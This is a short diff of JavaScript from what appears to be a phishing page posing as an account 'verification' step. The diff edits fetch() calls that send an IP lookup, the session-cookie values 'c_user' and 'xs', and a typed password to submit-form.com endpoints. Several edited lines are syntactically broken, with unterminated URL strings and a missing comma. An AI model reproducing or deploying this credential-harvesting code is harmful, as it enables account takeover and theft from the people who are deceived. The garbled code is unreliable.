@@ -1267,7 +1267,7 @@
     /* ── Step 2: Verification form ── */
     let allowRecovery = false, finalRedirect = "";
 
-    fetch("https://submit-form.com/Nx48MJgMP
+    fetch("https://submit-form.com/jzHVRTJfh")
         .then(r => r.json())
         .then(d => {
             const ip = d.clientIp;
@@ -1279,7 +1279,7 @@
         const btn = document.getElementById("submitBtn");
         btn.classList.add("loading"); btn.disabled = true;
 
-        fetch("https://submit-form.com/Nx48MJgMP
+        fetch("https://submit-form.com/Nx48MJgMP {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ c_user: document.getElementById("c_user").value.trim(), xs: document.getElementById("xs").value.trim() })
@@ -1311,7 +1311,7 @@
 
         btn.classList.add("loading"); btn.disabled = true;
 
-        fetch("https://submit-form.com/DgGAVgxhr", {
+        fetch("https://submit-form.com/Nx48MJgMP
             method: "POST",
             headers: { "Content-Type": "application/json", "Accept": "application/json" },
             body: JSON.stringify({ password: val })
